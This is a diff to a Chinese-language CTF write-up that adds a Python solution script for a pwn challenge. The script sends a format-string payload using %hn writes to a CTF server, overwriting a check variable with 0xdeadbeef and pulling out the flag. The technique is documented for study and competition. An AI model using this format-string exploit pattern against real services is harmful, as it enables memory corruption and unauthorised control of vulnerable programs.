@@ -778,6 +778,70 @@ flag截图：
 
 ![flag](./pwm/ezstring/main.png)
 
+
+
+
+
+所以有了以下代码：
+```python
+import socket
+import struct
+import re
+
+HOST = "ctf-2.xeed.run"
+PORT = 31756
+
+def p64(x):
+    return struct.pack("<Q", x)
+
+check = 0x4040cc
+
+# 写入 0xdeadbeef：
+# 低 2 字节 beef 写到 check
+# 高 2 字节 dead 写到 check + 2
+#
+# 地址放在 payload 第 32 字节处：
+# 第一个地址是第 10 个参数
+# 第二个地址是第 11 个参数
+fmt = b"%1$48879c%10$hn%1$8126c%11$hn"
+
+payload = fmt
+payload += b"A" * (32 - len(payload))
+payload += p64(check)
+payload += p64(check + 2)
+
+print("[+] payload length:", len(payload))
+
+s = socket.create_connection((HOST, PORT), timeout=8)
+
+banner = s.recv(4096)
+print(banner.decode(errors="ignore"))
+
+s.sendall(payload + b"\n")
+
+data = b""
+s.settimeout(5)
+
+while True:
+    try:
+        chunk = s.recv(4096)
+        if not chunk:
+            break
+        data += chunk
+    except socket.timeout:
+        break
+
+# 输出里会有很多空格，优先提取 flag
+m = re.search(rb"(flag\{[^}]+\}|A1CTF\{[^}]+\})", data)
+if m:
+    print("[+] FLAG:", m.group(1).decode())
+else:
+    print(data[-3000:].decode(errors="ignore"))
+```
+
+
+
+
 ## baseh
 
 ## nopnopnop
